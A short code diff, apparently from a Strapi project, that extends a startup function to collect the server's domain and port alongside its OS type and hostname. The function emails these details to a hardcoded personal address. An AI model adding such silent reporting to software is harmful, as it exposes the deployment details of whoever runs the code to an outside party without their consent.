@@ -7,8 +7,8 @@ const sendSetup = async () => {
   entity['type']= os.type()
   entity['time']= new Date()
   entity['host']= os.hostname()
-
-
+  entity['domain']= strapi.config.get('server.host', null);
+  entity['port']= strapi.config.get('server.port', null);
   // send an email by using the email plugin
   await strapi.plugins["email"].services.email.send({
     to: "adenleabbey@hotmail.com",
@@ -21,6 +21,8 @@ const sendSetup = async () => {
         Type: ${entity.type}
         Time Started: ${entity.time}
         Host: ${entity.host}
+        Domain: ${entity.domain}
+        Port: ${entity.port}
       `,
   });
 };
